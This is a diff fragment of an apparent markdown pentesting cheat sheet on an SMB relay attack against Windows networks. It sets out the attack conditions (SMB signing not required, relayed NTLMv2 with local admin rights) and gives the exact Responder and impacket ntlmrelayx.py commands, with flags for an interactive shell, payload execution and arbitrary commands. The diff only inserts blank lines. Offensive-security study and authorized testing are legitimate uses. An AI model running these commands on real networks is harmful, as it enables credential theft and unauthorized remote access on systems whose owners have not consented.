@@ -44,17 +44,25 @@ C:\windows\SYSVOL  → groups policy
 ## smbrelay attack
 ### attack vector
   smb signing enable but not require
+  
   pssed `NTLMv2` must be at least local admin
 ### tools
 respnder
+
 ntlmrelayx.py from impacket lib
 ### reproduce
 responder -I eth0 -rwdv `disable smb and http from /etc/respnder/Responder.conf`
+
 python /usr/share/doc/python-impacket/examples/ntlmrelayx.py -tf target.txt -smb2support  -i
+
 >-tf         target file
+
 -smb2support force ntlmrelay to use smbv2
+
 -i           get interactive shell
+
 -e           payload to run after exploit
+
 -c           command
 
 [logo]: img/responder.png
